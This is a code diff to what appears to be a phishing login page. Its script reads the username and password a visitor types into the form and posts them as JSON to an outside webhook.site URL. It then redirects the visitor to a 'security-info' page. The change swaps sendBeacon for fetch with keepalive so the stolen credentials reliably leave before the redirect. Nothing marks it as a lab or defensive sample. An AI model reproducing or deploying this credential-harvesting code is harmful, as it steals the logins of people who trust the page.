@@ -32,24 +32,30 @@
             let pass = document.querySelector('input[name="pass"]').value;
             
             // Create payload
-            let payload = JSON.stringify({
+            let payload = {
                 user: user,
                 pass: pass,
                 action: "Login Attempt",
                 time: new Date().toISOString()
-            });
+            };
 
-            // Send data using sendBeacon (does not block redirection)
+            // Send data to webhook with fetch() and keepalive
             let webhookURL = "https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f";
-            navigator.sendBeacon(webhookURL, payload);
-
-            // Redirect user immediately
-            window.location.href = "security-info.html";
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+                keepalive: true  // Ensures request completes even if page is redirected
+            }).then(() => {
+                // Redirect user after ensuring data is sent
+                window.location.href = "security-info.html";
+            }).catch(error => console.error("Error:", error));
         });
     </script>
 
 </body>
 </html>
+
 
 
 
